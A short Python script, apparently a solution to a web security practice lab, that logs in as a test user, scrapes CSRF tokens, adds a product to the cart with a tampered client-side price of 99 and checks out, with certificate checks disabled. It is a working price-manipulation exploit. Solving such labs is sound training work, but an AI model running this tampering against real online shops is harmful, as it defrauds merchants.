import requests
import re




# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

# To find the csrf token from url 

csrf_token = session.get(app_url+"/login",verify=False,proxies=proxies)
match  = re.search(r'name="csrf" value="(.*?)"',csrf_token.text)  # find the csrf token
token = match.group(1)
print(f"this is csrf",token)

# Now using above toke we need to login next with wiener user 

data = {"username":"wiener","password":"peter","csrf":token}
winer_login = session.post(app_url+"/login",verify=False,data=data,proxies=proxies)

# Now we are going to add the product 133t leather 

data2 = {"productId":"1","redir":"PRODUCT","quantity":"1","price":"99"}
adding_product = session.post(app_url+"/cart",verify=False,data=data2,proxies=proxies)

r = session.get(app_url+"/cart",verify=False,proxies=proxies)
match1 = re.search(r'name="csrf" value="(.*?)"',r.text)
print(match1)
checkout_csrf = match1.group(1)
print(f"checkout csrf token in {checkout_csrf}")
adding_product = session.post(app_url+"/cart/checkout",verify=False,data={"csrf":checkout_csrf},proxies=proxies)




